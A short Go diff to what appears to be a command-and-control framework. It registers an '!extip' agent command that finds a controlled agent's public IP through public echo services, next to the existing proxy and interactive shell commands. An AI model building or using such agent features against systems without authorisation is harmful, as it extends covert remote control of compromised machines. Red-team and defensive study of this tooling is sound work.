@@ -132,6 +132,19 @@ func C2Commands() *cobra.Command {
 	proxyStartCmd.Flags().StringP("target", "", "", "Target to dial, host:port")
 	rootCmd.AddCommand(proxyStartCmd)
 
+	// !extip — self-detect the agent's public egress IP via public echo
+	// services (random 3 of a pool, raced). Used by the web panel's "retest
+	// external IP" button; the CC cannot derive this address for relayed agents.
+	extIPCmd := &cobra.Command{
+		Use:     def.C2CmdExtIP,
+		Short:   "Detect this agent's public/external IP",
+		Example: "!extip [--quiet]",
+		GroupID: "generic",
+		Run:     runExtIP,
+	}
+	extIPCmd.Flags().BoolP("quiet", "q", false, "Suppress printing the result (data-only update for the CC)")
+	rootCmd.AddCommand(extIPCmd)
+
 	// Interactive PTY shell session (web console virtual terminal)
 	registerShellCmd(rootCmd)
 
